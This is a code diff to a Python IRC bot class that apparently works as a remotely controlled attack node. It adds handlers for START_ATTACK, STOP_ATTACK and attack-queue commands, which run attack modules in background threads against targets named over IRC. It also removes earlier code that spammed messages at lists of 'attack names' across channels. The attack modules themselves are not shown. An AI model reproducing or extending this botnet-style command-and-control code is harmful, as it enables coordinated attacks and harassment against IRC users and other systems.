@@ -1,9 +1,6 @@
 #!/bin/python
 
-import glob
 import hashlib
-import importlib
-import os
 import random
 import socket
 import ssl
@@ -11,13 +8,10 @@ import string
 import sys
 import threading
 import time
-import ircsocket
 
-# Loading all modules in /modules/
-#modules_path = "{0}{1}".format(sys.path[0], "/modules/")
-#os.chdir(modules_path)
-#for file in glob.glob("*.py"):
-#	import_module("{0}{1}".format(modules_path, file))
+import ircsocket
+import modules
+import moduledelegate
 
 class IRCTargetedSocket(ircsocket.IRCSocket, threading.Thread):
 	'''
@@ -41,8 +35,6 @@ class IRCTargetedSocket(ircsocket.IRCSocket, threading.Thread):
 
 		threading.Thread.__init__(self)
 
-		self.modules = []
-		
 		self.setNodes([])
 		
 		self.setAttackNames(attack_names)
@@ -61,8 +53,12 @@ class IRCTargetedSocket(ircsocket.IRCSocket, threading.Thread):
 
 		self.setNotifier(None)
 
-		
+		modDelegate = moduledelegate.ModuleDelegate()
+		self.setModules(modDelegate.getModules())
 
+		# Dictionary of Module -> Thread		
+		self.setAttackQueue({})
+	
 	def run(self):
 		self.connect()
 
@@ -163,22 +159,48 @@ class IRCTargetedSocket(ircsocket.IRCSocket, threading.Thread):
 		elif event == 11: #LIST_ATTACK_CHANNELS
 			self.listNames(target, "channels", self.getChannels())
 
-		elif event == 14:
-			
-			for channel in self.getChannels():
-				message = "".join(d + " " for d in data).rstrip()
-				for name in self.getAttackNames():
-					m = "{0} {1} {2}".format(name, message, self.getHash(6, 6)[2:])
-					self.sendMessage(channel, m)
-					#self.ctcp(name, "version")
-		'''		
-	
-			for name in self.getAttackNames():
-				message = "".join(d + " " for d in data).rstrip()
-				m = "{0} {1} {2}".format(name, message, self.getHash(6, 6)[2:])
-				self.sendMessage(name, m)
-			
-		'''
+		elif event == 13: #START_ATTACK
+			attackData = {
+				"node" : self,
+				"target" : target,
+				"data" : data
+			}
+
+			queue = self.getAttackQueue()
+			for attack in queue.keys():
+				if not attack.isRunning():
+					attack.setData(attackData)
+				
+					queue[attack].start()
+
+		elif event == 14: #STOP_ATTACK
+			queue = self.getAttackQueue()
+			for attack in queue.keys():
+				self.sendStatus("STOPPING. attack={0}".format(attack))
+
+				if attack.isRunning():
+					attack.stop()
+
+					queue[attack].kill_received = True
+
+					# Create a new thread since threads are only started once
+					t = threading.Thread(target=attack.start)
+					t.setDaemon(True)
+					queue[attack] = t
+
+		elif event == 15: #ADD_ATTACK_QUEUE
+			for d in data:
+				for m in self.getModules():
+					if m.getModuleName().lower() == d.lower():
+						t = threading.Thread(target=m.start)
+						t.setDaemon(True)
+						self.getAttackQueue()[m] = t
+
+		elif event == 16: #REMOVE_ATTACK_QUEUE
+			for d in data:
+				for m in self.getModules():
+					if m.getModuleName().lower()  == d.lower():
+						self.getAttackQueue()[m] = None
 
 	def processCommand(self, target, message):
 		pass
@@ -195,9 +217,26 @@ class IRCTargetedSocket(ircsocket.IRCSocket, threading.Thread):
 
 	def listNames(self, target, listname, names):
 		t = time.strftime('[%I:%M:%S]')
-		m = '{0} | [{1}@{2}] - {3}={4}'.format(t, self.getNickname(), self.getContext(), listname, names)
-		self.sendMessage(target, m)
-		self.sendStatus(m)
+		m = '{0} | [{1}@{2}] - {3}={4}'
+
+		i = 0
+		l = []
+		for name in names:
+			l.append(name)
+			i = i + 1
+		
+			if i % 16 == 0:
+				self.sendMessage(target, m.format(t, self.getNickname(), self.getContext(), listname, l))
+				self.sendStatus(m.format(t, self.getNickname(), self.getContext(), listname, l))
+				l[:] = []
+
+		if l != []:
+			self.sendMessage(target, m.format(t, self.getNickname(), self.getContext(), listname, l))
+			self.sendStatus(m.format(t, self.getNickname(), self.getContext(), listname, l))
+
+		if names == None or names == []:
+			self.sendMessage(target, m.format(t, self.getNickname(), self.getContext(), listname, names))
+			self.sendStatus(m.format(t, self.getNickname(), self.getContext(), listname, names))
 
 	def getCommands(self):
 		return self.commands
@@ -217,6 +256,12 @@ class IRCTargetedSocket(ircsocket.IRCSocket, threading.Thread):
 	def setAttackNames(self, attack_names):
 		self.attack_names = attack_names
 
+	def getAttackQueue(self):
+		return self.attack_queue
+
+	def setAttackQueue(self, attack_queue):
+		self.attack_queue = attack_queue
+
 	def getTrustedNames(self):
 		return self.trusted_names
 
@@ -228,6 +273,12 @@ class IRCTargetedSocket(ircsocket.IRCSocket, threading.Thread):
 
 	def setIgnoreNames(self, ignore_names):
 		self.ignore_names = ignore_names
+
+	def getModules(self):
+		return self.modules
+
+	def setModules(self, modules):
+		self.modules = modules
 
 	def getNodes(self):
 		return self.nodes
